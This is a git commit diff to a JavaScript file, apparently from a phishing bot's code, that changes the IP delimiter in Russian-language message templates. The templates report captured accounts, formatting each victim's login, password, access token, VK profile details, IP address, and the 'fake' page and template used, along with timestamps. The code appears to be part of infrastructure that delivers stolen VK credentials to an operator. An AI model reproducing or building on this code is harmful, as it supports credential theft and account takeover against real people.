e014f69ab9a5db1c7044965654520a33fddbd4e9
Gachinski <easywin.ru@gmail.com>
2021-11-25 20:02:14 +0300

    update

--- objects.js
+++ objects.js
@@ -168,7 +168,7 @@ const messages = {
         return  `Ваши аккаунты ${name}☘️\n\n😻 Login: <code>${login}</code>\n🗝 Password: <code>${password}</code>\n🖇  Token: <code>${token}</code>\n\n🚶Имя: ${first_name}\n🍌Фамилия: ${last_name}\n\n🆔 ID: <a href="https://vk.com/${id}">${id}</a>\n\n🤼 Друзей: ${friends}\n👨‍👩‍👧‍👦 Подписчиков: ${followers}\n\n${online_emoji} Статус: ${online}\n\n🎁 Подарков: ${gifts}\n\n📍 IP: <code>${ip.split(',')[0]}</code>\n🖥 Fake: <code>${fake}</code>\n🚧 Шаблон: <code>${pattern}</code>\n\n🗓 Дата: <code>${date}</code>\n🕰 Время: <code>${date2}</code>\n${c&&length==false?'':`${emptyString}[${c+1}/${length}]`}`
     },
     otherMessage: function (name, login, password, ip, fake, fake2, date, date2,   length, c){
-        return `Ваши аккаунты ${name}☘️\n\n😻 Login: <code>${login}</code>\n🗝 Password: <code>${password}</code>\n\n📍 IP: <code>${ip.split(';')[0]}</code>\n🖥 Fake: <code>${fake}</code>\n🚧 Шаблон: ${fake2}\n\n🗓 Дата: <code>${date}</code>\n🕰 Время: <code>${date2}</code>\n${c&&length==false?'':`${emptyString}[${c+1}/${length}]`}`
+        return `Ваши аккаунты ${name}☘️\n\n😻 Login: <code>${login}</code>\n🗝 Password: <code>${password}</code>\n\n📍 IP: <code>${ip.split(',')[0]}</code>\n🖥 Fake: <code>${fake}</code>\n🚧 Шаблон: ${fake2}\n\n🗓 Дата: <code>${date}</code>\n🕰 Время: <code>${date2}</code>\n${c&&length==false?'':`${emptyString}[${c+1}/${length}]`}`
     }
 }
 const editModeCaptions = {
